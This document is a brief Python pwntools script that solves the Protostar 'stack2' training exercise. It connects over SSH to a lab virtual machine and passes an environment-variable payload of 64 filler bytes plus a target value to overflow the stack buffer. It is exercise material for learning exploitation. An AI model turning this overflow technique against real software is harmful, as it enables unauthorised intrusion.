

from pwn import *


r = ssh(host='192.168.160.128', user='user', password='user')


payload =b'A'*64 + p32(0x0d0a0d0a) 

sh = r.run('/opt/protostar/bin/stack2', env={'GREENIE':payload})


print(sh.recvline().decode())



